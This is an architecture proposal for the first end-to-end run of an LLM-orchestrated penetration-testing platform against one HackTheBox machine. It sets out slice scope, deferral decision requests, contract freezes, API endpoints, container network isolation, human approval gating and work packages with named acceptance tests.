# Walking skeleton: the shortest road to one HackTheBox box

- **Date:** 2026-09-29
- **Author:** architect (proposal to the product owner)
- **Status:** PROPOSAL. Nothing here is a ruling. Every deferral of a frozen
  clause, a locked Q-decision or an Accepted ADR is written as a numbered
  **decision request (D10–D18)** in §2 and is unanswered until you answer it.
- **Question answered:** "how far are we away from the first HackTheBox test?"
- **Answer in one line:** ~21 sessions, first run attempt **2026-12-08**, band
  2026-11-24 → 2027-01-15 — versus February 2027 on the current plan, bought
  with nine named deferrals (§2) and one blocking ADR that does not exist yet (§5).
- **Not written by this document:** no ADR file, no contract file, no code, no
  session tracker. It changes nothing in the repo.

## 0. Ground truth

| Fact | Value |
|---|---|
| Contracts frozen | A0, A1 (42 event kinds), A2 (10 node kinds / 7 edge kinds) |
| Contracts not started | A3, A4, A5, A7, A8 (A6 deferred by Q1) |
| Production Go | 2145 lines in `internal/{errs,logging,ids,timex,caps,cjson}` |
| Tests | 4587 lines |
| In flight today | `internal/paging` (WP-08), `internal/secretscan` (WP-13) |
| `cmd/`, `deploy/`, `vendor/`, Dockerfile, binary | **none exist** |
| Planned road | WP-00…WP-22, all serving A0/A1/A2; WP-22 produces no runnable platform |
| Never-held design sessions | backlog §1 (A3), §3 UI, §4 Pi, §5 agent loop, §6 persistence, §7 security, §8 SSO, §10 observability, §11 model bench |
| CRIT finding with no ADR | **A3 worker egress** (`docs/adversarial-review-2026-09-03.md`) |

The gap is not "more packages". It is that nothing in the repo can *run*: no
binary, no image, no compose file, no HTTP listener, no container spawn. The
existing road ends at WP-22 with a very well-tested library and no product.

---

## 1. THE SLICE

### 1.1 Target class of box

ADR-0004 makes AD the emphasis. The first box is **not** an AD box: it is the
cheapest target that exercises the whole loop once. AD is the *second* box.

| Criterion | Required | Why |
|---|---|---|
| OS | Linux | SPEC §11: Windows-based workers are a v1 non-goal |
| Difficulty | Easy | one foothold technique, no rabbit holes |
| Path shape | network service → enumeration → credential or public exploit → **user shell** | exercises nmap, one service tool, one approval, one exploit |
| Privesc / root | **not required** | the slice is recon-to-foothold; including root doubles the approval classes |
| Web-app-only paths | excluded | a browser worker image + screenshot evidence is a whole extra WP |
| AD / Kerberos / LDAP / SMB-AD | excluded | needs `worker-ad` image, bloodhound, a domain — the second box |
| Multi-machine / chaining | excluded | one /32 scope |
| Reachability | one IP behind the HTB VPN, routable from the Docker host | constrains the egress ADR (§5) |
| Prior knowledge | **a box you have already rooted** | the run becomes gradable: we know the intended path, so a failure is a platform failure and not a puzzle failure |

**I do not know the current HTB catalogue, which machines are live, or which
your account can start.** You pick the instance against the table above. What I
can say is the shape: one non-HTTP service (FTP/SMB/SSH/Redis/SMTP/…), a
credential or a well-documented service exploit for foothold, no vhost maze.

Second-order consequence worth stating now: **the box IP is not known until you
start it.** So scope cannot be filled in before the run exists. The runbook is
start box → read IP → `POST /engagements` with that /32 → start run. This is one
reason the engagement-creation UI is deferred (§2.4) and the API is not.

### 1.2 SPEC §5 steps 1–10

| # | Step | Verdict | Justification (one line) |
|---|---|---|---|
| 1 | Engagement: client, scopes, blacklist, operators, model-role config, RoE | **STUBBED** | created by one `curl` against `POST /api/v1/engagements` with an admin token from the runbook; scope/blacklist/operator/model-role are real and enforced, RoE templates and the settings GUI are not built |
| 2 | Operator starts a run → validate scope/blacklist → broker spawns orchestrator with a job token | **IN** | this is the spine; nothing else in the slice matters if this is fake |
| 3 | Recon phase, auto: orchestrator requests enumeration workers → event log + graph | **IN** | the whole point of the run; worker = one recon image, results platform-ingested into the graph (Q6: workers are report-only) |
| 4 | Research phase, auto: reason over graph views, hypotheses as provenance-carrying nodes | **STUBBED** | no separate research stage or agent profile; the orchestrator's own loop writes `hypothesis`/`finding` nodes. "graph views" is replaced per **D11** |
| 5 | Action proposal: tool + exact args + target, re-check scope/blacklist, risk-tier, approval queue, notify (webhooks, SSE) | **IN** (SSE **STUBBED** → polling per **D13**) | ADR-0018's fingerprint and ADR-0005's re-check are the product; the transport that tells you about it is not |
| 6 | Approval binds to the fingerprint, 2h expiry, `approval_expired` → replan | **IN** | frozen behaviour, cheap once A7-min exists, and it is the property you asked for ("a human approving every dangerous action") |
| 7 | Execution: worker runs it, streams command log centrally, stores evidence incl. screenshots, records a revert record | **IN**, screenshots **OUT**, revert record **IN but never executed** | `command_executed`/`evidence_stored`/`revert_recorded` are three event appends from the worker (A1-7.4's three **C** kinds); a browser worker image is a separate WP with no consumer in this slice |
| 8 | Loop: query graph, self-correct, iterate 3–7 | **IN** | ADR-0015/0016 with D11's paged reads instead of composed views; bounded iterations, no unbounded agent |
| 9 | Report: HTML from graph/findings/log/evidence | **OUT** (**D15**) | nothing about "one HTB box" needs a deliverable; the log is the deliverable and it is already inspectable |
| 10 | Cleanup: revert plan → operator approval → execution → verification | **OUT** (**D14**) | HTB boxes are reset by the platform; the revert *records* are still written so the assembler can be built later against real data |

Also **OUT** of the slice, from SPEC §4/§9/§10 and the enterprise list: the Pi
remote agent (backlog §4), mesh transport (ADR-0013), SSO/OIDC (§8), audit/SIEM
export, backup/restore runbook, HA, four-eyes approval, automation keys (Q7
already excludes them), PDF export, attack-path visualisation, model
benchmarking (§11), masking (§7 / ADR-0020 §3), `worker-browser`,
`remote-agent` image.

### 1.3 Topology of the slice

```
 host (HTB VPN up)
 ├── postgres                      ── internal net only
 └── platform  (cmd/platform)      ── internet (LLM egress) + docker.sock
      │  UI (HTMX) · /api/v1 · policy · broker · llm gateway · ingest · notify
      ├── orchestrator container   ── run net: platform API only. no internet, no target, no socket
      └── worker container(s)      ── run net: platform API + HTB target subnet. nothing else
                                        (egress allowlist = host firewall, §5)
```

Two Docker networks: `platform` (platform↔postgres↔internet) and a per-run
`run` network drawn from a pre-provisioned pool. The orchestrator deliberately
has **no** route to the target — it never executes anything (ADR-0007, A1-7.4:
an orchestrator that never runs a command MUST NOT be able to claim one).

---

## 2. THE DEFERRALS

### 2.1 The two levers, and what they actually buy

| Lever | What it says | What it buys here |
|---|---|---|
| **Q13** additive-only `/api/v1` | new fields, kinds and endpoints are allowed; removal/repurposing is not; breaking → `/api/v2` | every deferral below is *additive to reverse*: no migration, no v2, no client rewrite. This is what makes deferring safe rather than merely tempting |
| **Q1** A3 review trigger | "after first real HTB engagement" | A3 (stage views) is **already scheduled after the first run by your own decision**. Building A3 first would invert that order and design views without data about what the orchestrator actually needed |

One important limit on Q13, from A1-4.10: a new payload *field* or an 18th
envelope key on an existing event kind **is breaking**, because the bytes are
hashed. So "additive later" holds for new kinds and new endpoints, and does
**not** hold for widening a frozen event payload. Nothing below needs that.

### 2.2 Which of the 42 event kinds the loop actually emits

WP-09 implements all 42 payload structs regardless — they are transcription
work under a reflection test, and the taxonomy is closed. The deferral is about
which kinds have a **live code path**.

| Group | Kinds | Slice |
|---|---|---|
| Integrity | `chain_genesis`, `chain_verified` | **IN** (Q11: chaining from day one; verification at startup) |
| Integrity | `chain_break_detected`, `integrity_override`, `artifact_released` | **structs IN, path OUT** — nothing emits them until an export or a tamper exists; ADR-0021's override needs a report to stamp |
| Engagement | `engagement_created`, `scope_changed`, `run_started`, `run_ended` | **IN** |
| Engagement | `engagement_closed`, `engagement_policy_changed` | **OUT** — one engagement, one policy, never edited mid-run |
| Model | `model_config_snapshotted`, `llm_call` | **IN** (SPEC §7 reproducibility; `masked_entity_count` is emitted as `0` under `cloud_raw`, D12) |
| Lifecycle | `job_spawned`, `task_spawned`, `container_started`, `container_killed`, `hard_stop_fired`, `spawn_requested` | **IN** — all six, this is ADR-0017 made observable |
| Execution | `command_executed`, `evidence_stored`, `task_result`, `revert_recorded` | **IN** — the worker's whole vocabulary (A1-7.4's three **C** kinds + platform-composed `evidence_stored`) |
| Approval | `approval_requested`, `approval_granted`, `approval_denied`, `approval_expired`, `approval_executed` | **IN** — all five; single-use (Q10) and 2h expiry are frozen behaviour, not extras |
| Graph | `graph_node_written`, `graph_edge_written` | **IN** |
| Graph | `graph_node_quarantined`, `quarantine_recomputed` | **IN** — C5/D7 require an out-of-scope or blacklisted discovery to be *recorded*, not dropped, and the HTB VPN subnet guarantees we discover things outside the /32 |
| Graph | `graph_edge_retracted`, `report_inclusion_changed` | **OUT** — retraction is self-correction polish (Q2's `supersedes` covers revision); report inclusion needs a report (D15) |
| Enforcement | `scope_denied`, `blacklist_denied`, `action_blocked`, `agent_error` | **IN** — non-negotiable: A1-7.5 makes a refused write that leaves no trace the way a hallucination loop hides |
| Cleanup | `cleanup_planned`, `cleanup_executed`, `cleanup_verified` | **OUT** (D14) |
| Notify | `notification_sent` | **IN** — including `chain_head_anchor` (D5, A1-5.8 (4)); see §6 |

**Live in the slice: 29 of 42.** Structs for all 42 either way.

### 2.3 Graph kinds

A2's 10 node kinds and 7 edge kinds are already frozen and closed, so
*not exercising* a kind is not a contract deferral and needs no decision —
only the A2-10.3 endpoint-matrix rows for those kinds go untested in
production. The loop uses: `host`, `network`, `service`, `identity`,
`credential`, `evidence_ref`, `finding`, `hypothesis`; edges `reachable`,
`exploited_by`, `authenticates_to`, `contradicts`, `supersedes`. Deferred as
unexercised: `group`, `share` (AD-shaped), edges `member_of`, `grants_access`.
WP-14/15/16 still implement and test all of them — the validation is table-driven
and the table is frozen, so implementing the whole thing is barely more work
than implementing a subset, and a subset would mean editing a frozen list.

### 2.4 DECISION REQUEST — D10 … D18

Continuing the D1–D9 series from PR #2. **Type** says what is being deferred:
*frozen clause* (needs your explicit decision per `contracts/README.md`),
*locked Q* , *Accepted ADR*, or *product scope* (SPEC-level, no frozen clause
touched). **Blocks code** = must be answered before the named WP starts.

| # | Clause / decision | Proposed deferral | Type | Cost if accepted | Reversal path | Blocks code |
|---|---|---|---|---|---|---|
| **D10** | Q12 "full `/api/v1` from day one"; Q7 `GET /engagements/{id}/findings` JSON export "included in v1" | Freeze **A4 at ≈20 endpoints** (§3.2) instead of the full surface; findings export not built | locked Q ×2 | no automation surface, no findings export, no engagement/settings CRUD endpoints; a human with `curl` does step 1 | purely additive under Q13 — new endpoints, no migration, no `/api/v2` | **yes**, WP-28 |
| **D11** | Q1 fixed stage views + capped 1-hop; Q4's four byte budgets; A0-7.10 composition rule (assigned to A3 by D4) | **Do not write A3 before the first run.** The orchestrator reads the graph through A2-11's read seam, exposed as `GET /engagements/{id}/graph/nodes` and `/edges` with A0-4 paging and A1-8.3 filters, hard `limit` capped. This is **not** the A6 free-form query endpoint: no filters beyond the frozen ones, no traversal expressions | locked Q ×2 + frozen clause (A0-7.10 left unowned) | weaker context hygiene (ADR-0007): the orchestrator burns tokens paging instead of receiving one ≤64 KiB composed view; Q4's budgets go unexercised; D4's composition rule stays unowned; A3's byte budget for ADR-0022's provenance grade is unmeasured | additive: a new endpoint family computing views over data that already exists. Retro-fittable onto the first engagement, which is exactly what Q1 wants | **yes**, WP-28/33 |
| **D12** | ADR-0020 §1/§3 (`cloud-masked`, the pseudonymisation mapping table); A1 `llm_call.masked_entity_count` | Gateway implements **`cloud_raw` and `local_only` only**; `cloud_masked` is rejected at engagement create with A0-3 `validation`. ADR-0020 **§4 secret exclusion is NOT deferred** — it applies under every policy and is enforced at the gateway by `internal/secretscan` | Accepted ADR | no customer engagements at all; HTB/lab only. Residual A4 exposure is exactly what ADR-0020 §5 already declares | masking is a gateway-internal transform; `masked_entity_count` already exists in the frozen payload, so enabling it adds no field and no migration | **yes**, WP-32 |
| **D13** | A1-8.5 (SSE: emit after commit, `seq` order, at-least-once); ADR-0012 §5 (in-UI notifications via SSE); SPEC §9 | **No SSE.** The approval queue and run view use HTMX `hx-trigger="every 2s"` against the frozen A1-8 read endpoint with a cursor | frozen clause + Accepted ADR | ≤2 s approval latency against a 2 h expiry (0.03% of the window); ADR-0012 §5 unmet; P-98's two SSE test ids unwritten; no push to a background tab | additive: same read path plus a broadcaster; the cursor semantics are already frozen, so the client code barely changes | **yes**, WP-28/35/38 |
| **D14** | SPEC §5 step 10; ADR-0009 §4; A1 `cleanup_planned/_executed/_verified` | **No cleanup run.** Workers still emit `revert_recorded` for every state-changing effect (it is one event append); nothing assembles or executes a revert plan | Accepted ADR + product scope | if the run drops a webshell or creates an account, the revert data is in the log and no code acts on it; you reset the box by hand | additive: the assembler reads chained `revert_recorded` rows, so it can be built later and run against historical engagements | no (before the run) |
| **D15** | SPEC §5 step 9; ADR-0009 §5; Q11's export block (A1-6.6); Q7 findings export | **No report generator.** Evidence is read via the UI event view, `GET /evidence/{id}`, and a documented `psql` export in the runbook | Accepted ADR + locked Q | A1-6.6's "customer-facing exports blocked on integrity failure" is untestable; `artifact_released` has no emitter; no deliverable for anyone but you | additive; the graph and event log are the report's inputs and are unchanged by this | no |
| **D16** | SPEC §3 (Admin manages the tool registry); ADR-0008's discovery surface | **Registry = a versioned JSON file under `deploy/tools/` loaded at boot**, ~3 entries, `image_digest` pinned by our own CI build. No registry UI, no image signing, no SBOM/CVE watch (A10 stays open) | product scope + Accepted ADR follow-up | supply-chain controls absent — bounded because we build the images ourselves and `action_blocked{image_not_allowed}` still enforces the pinned digest; you cannot add a tool without a redeploy | additive: the entry struct is the shape, swap the source from a file to a table + UI | no |
| **D17** | SPEC §3 (PBKDF2-SHA256 **+ TOTP RFC 6238**, session cookies) | **No TOTP.** PBKDF2-SHA256 (RFC 6070 vectors) + HttpOnly/SameSite=Strict/Secure session cookie, CSRF token on every state-changing form. Users seeded from env at first boot: one admin, one operator (may be the same person). No user-management UI | product scope | **no second factor on the account that approves dangerous actions and fires the hard stop.** Acceptable only while the UI is bound to loopback/LAN and reached over a VPN you already trust | additive: one column, one login step, RFC 6238 vectors | **yes**, WP-24 |
| **D18** | ADR-0017 §3 "hands the orchestrator the worker's job-scoped endpoint" | **Worker results return via the platform, not orchestrator→worker.** The worker posts its three **C** kinds + `evidence:upload` (Q6 addendum, A1-7.4); the orchestrator polls `GET /api/v1/spawns/{spawn_id}` for the result summary. ADR-0017 §3's "endpoint" is satisfied by the spawn id | Accepted ADR (wording) | one extra hop, higher result latency, the platform is on the result path | additive: a direct channel can be added later without touching the platform path | **yes**, WP-27 |

**Why D18 is a recommendation and not a shrug:** A1-8.4 already forbids granting
a worker any read scope, and A1-7.4 gives it exactly three append kinds. A
worker therefore *cannot* be a client of anything but the append/upload
endpoints. Routing results through the platform also keeps the orchestrator out
of the same L2 domain as hostile workers — with a direct channel, a compromised
worker container has a network path to the component that decides what to attack
next. The extra hop is the cheaper of the two.

### 2.5 Deferrals that touch no frozen clause (listed for acceptance, no D)

| Cut | Cost |
|---|---|
| Engagement/scope/blacklist editing UI | step 1 is `curl`; a typo in a CIDR is caught by A2's `cidr` parse, not by a form |
| Evidence browser page | evidence read by `GET /evidence/{id}` + `sha256sum`; the *store* stays (§6) |
| Settings UI (LLM endpoints, model-role matrix, notification channel, approval timeout) | env vars per DESIGN §7; changing the model = redeploy |
| Webhook-channel configuration UI | **a security win, not just a cut:** the webhook URL comes from env, so A9's SSRF vector (user-configured webhook URL) does not exist in the slice |
| `worker-browser` image, screenshots | SPEC §5 step 7's "incl. screenshots" unmet; no web-app box in the slice |
| Remote agent node, mesh transport | SPEC §4 component 4 absent; ADR-0013 untouched, `slp_node_` unexercised |
| Rate limiting / quotas beyond a max-iterations bound and a per-run container cap | A14 stays open; one operator, one run |
| Observability session (§10), `/metrics` | `slog` JSON + `GET /healthz` only |

### 2.6 Contingency levers, in the order I would pull them

Only if the schedule slips. Each is a decision request when pulled.

| # | Lever | Saves | Breaks |
|---|---|---|---|
| L1 | Ship WP-38 with the approval queue only; no run view, no event browser | ~½ session | you watch the run in `docker logs` + `psql`; the approval page still shows the exact argv |
| L2 | One worker image instead of two (recon + exploit merged) | ~½ session | bigger blast radius per container, weaker ADR-0008 category story |
| L3 | Scope the shared contract suite (WP-19/20/21) to the kinds and clauses the slice emits | ~1 session | **I recommend against.** `contracts/README.md`'s merge gate is yours, and every safety-path clause needs its positive *and* negative id |
| L4 | Drop `graph_edge_retracted` handling from ingest | ~0 | nothing; already OUT |
| L5 | Defer WP-12's verification walk, keep write-side chaining | ~1 session | **the log stops being tamper-*evident*.** Do not pull this — it is the property you named in the question |

---

## 3. THE CONTRACTS

### 3.1 Verdict per contract

| ID | Freeze before code? | Minimum viable scope | Why |
|---|---|---|---|
| **A7** spawn + action fingerprint | **YES — must freeze** | spawn request (tool id + version, capped untrusted task description, resource ask — Q14); platform-derived `image_digest` + risk tier; **the action fingerprint**: canonical-JSON (A0-2) hash over `{tool_id, tool_version, argv[], targets[], engagement_id, run_id}`, its exact preimage byte layout, and a **normative vector** in the style of A1 §4.3 | four packages touch it (broker, api, ui, agentloop) and it is hashed. Two implementers who disagree by one byte produce approvals that never validate at execution time — a silent, safety-critical failure. ADR-0018 §2's re-validation is untestable without a frozen preimage. **No interim ruling is acceptable here** |
| **A4** `/api/v1` | **YES — must freeze, narrowed per D10** | ≈20 endpoints (§3.2), each with: method, path, principal class, required scope, request/response shape by reference to A0/A1/A2 types, A0-3 error kinds, A0-4 paging where a list | it is the surface every component codes against. Freezing it narrowed is cheap *because* Q13 makes widening additive |
| **A5** tokens | **YES — must freeze, minimal** | two principal classes (user session, job/task token); the **Q6 exclusion list verbatim** with its three enforcement layers; token shape + A0-1.2 prefixes; hash-only storage; revocation on run end / hard stop / token kill (Q8); the A1-7.4 append-permission table restated as scopes. **Out:** `slp_node_`, mTLS, rotation, rate limits, engagement-assignment audit (already backlog debt) | Q6 is already a locked decision and A1-7.4 already fixed the permission matrix, so A5-min is largely transcription — but it is the input to the middleware in every handler, and it guards authorization, so the safety-path pairing rule (`Tests:` positive + negative per clause) applies |
| **A8** config | **NO — interim ruling** | session-tracker ruling: DESIGN §7 stands verbatim (env → typed struct at the `cmd/` edge, no `os.Getenv` below `cmd/`, no config files), plus a one-page env-var table per binary in the tracker | one consumer per binary, no cross-package agreement needed, no safety path, and DESIGN §7 already fixes the shape. Writing A8 first is process for its own sake |
| **A3** stage views | **NO — replaced (D11)** | see §3.3 | Q1 sets the review trigger *after* the first real engagement |
| **A6** bounded query | already deferred by Q1 | — | unchanged |

### 3.2 A4-min endpoint list (the freeze input, ≈20 rows)

| Method + path | Principal | Purpose |
|---|---|---|
| `GET /healthz` | none | liveness, no envelope |
| `POST /api/v1/engagements` | admin | step 1 (scope, blacklist, operators, model role, `llm_data_policy`, approval timeout) |
| `GET /api/v1/engagements/{id}` | admin/operator | read back what was created |
| `POST /api/v1/engagements/{id}/runs` | operator | step 2 → validates scope/blacklist → broker spawns the orchestrator → returns `run_id` + `job_id` |
| `POST /api/v1/runs/{id}/hard-stop` | admin/operator | C5/ADR-0005 §4 |
| `GET /api/v1/engagements/{id}/events` | admin/operator | A1-8.1/8.2/8.3 paged + filtered; the polling substrate for D13 |
| `GET /api/v1/engagements/{id}/events/{event_id}` | admin/operator | engagement-scoped single read (A1-8.6 negatives) |
| `POST /api/v1/engagements/{id}/events:append` | worker (`task_`) | A1-7: the three **C** kinds only |
| `GET /api/v1/engagements/{id}/graph/nodes` | orchestrator (`job_`), admin/operator | **the A3 replacement**; A0-4 paging, `kind` filter, quarantined/retracted omitted (A2-8 planning read) |
| `GET /api/v1/engagements/{id}/graph/edges` | orchestrator, admin/operator | same |
| `GET /api/v1/tools` | orchestrator | registry read so it can only propose known tools (Q14) |
| `POST /api/v1/runs/{id}/spawns` | orchestrator | A7 spawn request |
| `GET /api/v1/spawns/{spawn_id}` | orchestrator | poll status + result summary (**D18**) |
| `GET /api/v1/engagements/{id}/approvals?status=pending` | operator, UI | the queue |
| `GET /api/v1/approvals/{apr_id}` | operator, UI | the fingerprint + exact argv + untrusted-content flag (ADR-0018 §4) |
| `POST /api/v1/approvals/{apr_id}:grant` | operator (assigned only) | single-use (Q10), binds `fingerprint_hash`, sets `expires_at` |
| `POST /api/v1/approvals/{apr_id}:deny` | operator (assigned only) | |
| `POST /api/v1/runs/{id}/llm:chat` | orchestrator, worker | the gateway; streaming; ADR-0020 policy enforcement |
| `POST /api/v1/engagements/{id}/evidence` | worker | upload; platform composes `evidence_stored`; secretscan rejects (D8: reject, never redact) |
| `GET /api/v1/evidence/{evi_id}` | admin/operator | engagement-scoped download |

**Not in A4-min:** SSE stream (D13), findings export (D10/Q7), engagement
update/close, settings, users, tool-registry writes, verification trigger,
integrity override, quarantine release (D6 says there is none), node pairing,
cleanup, report.

### 3.3 What A3 is replaced by, and why that is defensible under Q1

**Replacement:** the two paged graph-read endpoints above. Server-computed,
fixed shape, closed filters, A0-4 cursors, A0-7 caps on every field, and A2-8's
planning read semantics (quarantined and retracted rows omitted). The
orchestrator asks for `limit=50` nodes of the kinds it needs and pages.

**Defensible because:**

1. Q1's own words set the A3 review trigger at **"after first real HTB
   engagement"**. Designing A3 before the run inverts a locked decision. The
   run is the input to A3, not its consumer.
2. D4 handed A3 the real A0-7.10 composition rule and told it to budget bytes
   for ADR-0022's provenance grade. **Neither number can be chosen honestly
   without knowing what a real engagement's graph looks like.** Guessing now
   means re-guessing in November with data.
3. The replacement touches **no frozen clause**: A2-11's read seam, A0-4's
   paging and A1-8.3's filter vocabulary all exist and are frozen. We are
   exposing frozen machinery, not inventing a surface.
4. It is **not** A6. A6 is a free-form query endpoint, deferred by Q1 and still
   deferred: no traversal expressions, no client-chosen projections, no
   client-chosen filters beyond the frozen ones.
5. Q13 makes the reversal additive: A3 arrives as new endpoints beside these,
   and the paged reads can stay as the drill-down primitive A3's 1-hop step
   needs anyway.

**The honest cost:** context hygiene (ADR-0007) is worse than Q4 intended, so
the orchestrator spends tokens on paging that a composed view would have
compressed. On one easy box with a bounded loop this is a cost in €, not in
correctness. On a 200-host AD engagement it would be a blocker — which is
precisely why Q1 put the review after the first engagement and before the real
ones.

### 3.4 Interim rulings to record in a session tracker (not contracts)

| Ruling | Content |
|---|---|
| **IR-1** (A8) | DESIGN §7 verbatim + the env-var table per binary |
| **IR-2** (A3) | D11's replacement, so an implementer never has to guess |
| **IR-3** (backlog §5, agent loop) | **one page, and it is a hard gate on WP-33:** the orchestrator's tool-call vocabulary (how many tools it sees; `request_spawn`, `read_graph`, `propose_action`, `finish` as JSON), max iterations, max concurrent workers, what happens on malformed tool-call JSON (retry N times then `agent_error`), what happens on `approval_expired` (replan), what the system prompt may and may not contain |
| **IR-4** (backlog §6, persistence) | the DDL for the slice's tables; migrations are numbered `.sql` files applied in order at boot, no migration tool (stdlib only), `COLLATE "C"` on every id column |
| **IR-5** (backlog §7, A3 egress) | becomes a real ADR — §5 below |

---

## 4. THE WORK PACKAGES

WP-00…WP-22 keep their briefs unchanged. WP-08 and WP-13 are in flight today.
The remaining existing packages (WP-09…WP-12 events, WP-14…WP-16 graph, WP-17
store seams, WP-18 ingest, WP-19…WP-21 contract suites, WP-22 store/postgres)
are **all still on the path** — there is nothing in them to cut: WP-18 is what
puts anything into the graph at all (workers are report-only, Q6), and WP-12 is
what makes the log tamper-*evident* rather than merely tamper-*chained*.

New packages continue at WP-23. Format follows the principal review §4.
∥ = parallel set; no two packages in a ∥ set touch the same file. ★ = on the
critical path in §4.2.

| WP | Concern | Contract excerpt (the only input) | Files | Acceptance tests (named) | Depends | Set |
|---|---|---|---|---|---|---|
| **23** ★ | `store/postgres`: schema, migrations, and the slice's store implementations (auth, engagement, run, approval, tool, evidence, notify, graph, events) | A1-5.4/5.6/5.7/7.6/7.9, A2-1.4/3.5/4.7/4.8, A0-1.9, IR-4, backlog §6 store-seam duties | `internal/store/postgres/{migrate.go,schema/*.sql,auth.go,engagement.go,approval.go,tool.go,evidence.go,notify.go}` (+ WP-22's `events.go`/`graph.go`) | `TestMigrationsApplyInOrderAndAreIdempotent`, `TestAppendSerializesPerEngagement`, `TestIDOrderingMatchesByteOrderCollateC`, `TestDBLevelAppendOnly`, `TestChainHeadTrailRejectsUpdateAndDelete`, `TestKillOutboxSurvivesStoreFailure`, `TestDedupConstraintBlocksRace`, `TestEveryReadTakesEngagementID`, `TestApprovalIsSingleUseAtDBLevel` (Q10), `TestSessionHashOnlyStorage` | 17, 22 | — |
| **24** | `internal/auth`: PBKDF2-SHA256 passwords + session cookies (**AGENTS.md high review bar**) | SPEC §3, D17, A0-3, A5-min §user principals | `internal/auth/{password.go,session.go,cookie.go,csrf.go}` | `TestPBKDF2MatchesRFC6070Vectors`, `TestVerifyIsConstantTime`, `TestSessionCookieFlagsHttpOnlySameSiteStrictSecure`, `TestSessionIDUsesCryptoRand`, `TestSessionRevocationIsImmediate`, `TestCSRFTokenRequiredOnEveryStateChange`, `TestNoSecretInLogRecords`, `TestWrongPasswordIsSameErrorKindAndLatencyClass` | 23 | α |
| **25** | `internal/auth`: machine tokens — job/task tokens, Q6 scopes and exclusion list | A5-min, Q6, Q8, A1-7.4 | `internal/auth/{jobtoken.go,scope.go,principal.go}` | `TestTokenShapeAndPrefixPerA0_1_2`, `TestHashOnlyStorage`, `TestQ6ExcludedVerbsHardBlocked` (one subtest per excluded verb), `TestMachinePrincipalBlockedFromUserEndpoints`, `TestTokenBoundToEngagementAndRun`, `TestRevocationOnRunEnd`, `TestRevocationOnHardStop`, `TestWorkerHasNoReadScope` (A1-8.4), `TestWorkerAppendLimitedToThreeCKinds` (A1-7.4) | 24 | α |
| **26** ★ | `internal/policy`: scope / blacklist / approval / hard-stop — the single enforcement chokepoint (DESIGN §1: imports no other service) | ADR-0005 §2–§5, ADR-0018 §2, C5, A1-3.3 (`scope_denied`, `blacklist_denied`, `action_blocked`), A2-8 (quarantined target) | `internal/policy/{scope.go,blacklist.go,decision.go,hardstop.go}` | `TestBlacklistBeatsAllowlist`, `TestBlacklistBeatsApproval`, `TestScopeCIDRMatch`, `TestScopeHostnameMatch`, `TestOutOfScopeDeniedAndChained`, `TestQuarantinedTargetDenied`, `TestRiskTierDrivesApprovalRequirement`, `TestExecTimeRevalidatesFingerprintScopeBlacklistExpiry` (ADR-0018 §2, four subtests), `TestHardStopBlocksEveryActionKind`, `TestHardStopIsRespawnProof`, `TestDecisionOrderIsDeterministic`, `TestPolicyImportsNoOtherService` (import audit) | 11, 23 | — |
| **27** ★ | **Contract freeze: A7-min** — spawn request + action fingerprint + normative fingerprint vector | ADR-0017, ADR-0018, Q14, D18, A0-2 | `contracts/A7-spawn.md`, `contracts/README.md`, session tracker | none (docs); §6 PO checklist answered; **the fingerprint vector is recomputed by `docs/reviews/verify-vectors.py`** | D18 answered | δ |
| **28** ★ | **Contract freeze: A4-min + A5-min**, plus IR-1/IR-2/IR-3 recorded | D10, D13, Q6, Q8, Q12, A0-3/A0-4, A1-7.4, A1-8 | `contracts/A4-api.md`, `contracts/A5-tokens.md`, `contracts/README.md`, session tracker | none (docs); §6 PO checklists answered | D10, D13, D17 answered | δ |
| **29** ★ | `internal/broker`: hand-rolled Docker Engine client over the unix socket (stdlib `net/http` + `DialContext` on `unix://`) + container lifecycle | A7-min, ADR-0017, ADR-0002, A1-3.3 lifecycle kinds | `internal/broker/{dockerclient.go,spawn.go,lifecycle.go,network.go}` | `TestCreateContainerBodyMatchesA7Golden`, `TestImageDigestIsRegistryDerivedNeverCallerSupplied` (A10), `TestOrchestratorGetsNoDockerSocketMount`, `TestWorkerGetsNoDockerSocketMount`, `TestAgentContainerEnvCarriesOnlyItsJobToken`, `TestOrchestratorHasNoRouteToTargetNetwork`, `TestKillIsForcefulAndIdempotent`, `TestHardStopKillsEveryContainerOfRun`, `TestNoRespawnAfterHardStop`, `TestUnixSocketClientNeedsNoDependency` (`go list -deps` assertion, ADR-0010) | 26, 27, 31 | — |
| **30** ★ | `netpolicy` (E1): run-network pool allocator in the broker + host firewall rules + **the egress probe** | the new egress ADR (§5), A1-3.3 `action_blocked{quota_exceeded}` | `internal/broker/netpolicy.go`, `deploy/netpolicy/{rules.nft,pool.json,install.sh,probe.sh}` | `TestAllocateReturnsDistinctPooledNetworks`, `TestPoolExhaustedIsConflict`, `TestEgressProbeAllowsTargetSubnet`, `TestEgressProbeAllowsPlatformAPI`, `TestEgressProbeDeniesInternet`, `TestEgressProbeDeniesPlatformInternalNet`, `TestEgressProbeDeniesICMPOutsideTarget` (probe cases are opt-in integration per DESIGN §8, run in the acceptance runbook) | 29 | — |
| **31** | `internal/tools`: the registry (static, pinned digests, risk tiers, invocation contracts) | ADR-0008, Q14, D16, A1-3.3 `action_blocked{image_not_allowed}` | `internal/tools/{registry.go,entry.go,risk.go}`, `deploy/tools/registry.json` | `TestEveryEntryHasEveryADR0008Field`, `TestRiskTierDrivesApprovalRouting`, `TestImageDigestPinnedAndValidated`, `TestUnknownToolIDRejected`, `TestArgvLengthAndCountCapped`, `TestNoToolCanTargetAnArbitraryURL` (A3: no generic upload tool), `TestToolIDShapePerA0_1_3` | — | β |
| **32** ★ | `internal/llm`: OpenAI-compatible provider client (streaming, tool calls) + the gateway | ADR-0006, ADR-0014, ADR-0020 §1/§2/§4, D12, A1-3.3 `llm_call`, A0-3.7 | `internal/llm/{provider.go,stream.go,toolcall.go,gateway.go,policy.go,egresslog.go}` | `TestChatCompletionRequestShape`, `TestSSEStreamFramingAndDoneSentinel`, `TestStreamHandlesSplitChunkMidEvent`, `TestToolCallParsing`, `TestMalformedToolCallIsRetryableThenAgentError`, `TestGatewayBlocksCloudEndpointUnderLocalOnly`, `TestSecretExclusionUnderEveryPolicy` (ADR-0020 §4, secretscan), `TestEgressLogStoresEndpointNameNeverURL` (A0-3.7), `TestLLMCallEventPerCallWithMetadataOnly`, `TestMaskedEntityCountZeroUnderCloudRaw`, `TestCloudMaskedRejectedAtEngagementCreate` (D12), `TestNoModelCredentialInAnyAgentResponse`, `TestProviderTimeoutProducesRetryableError` (**AGENTS.md high review bar: streaming parser**) | 11, 13, 23 | — |
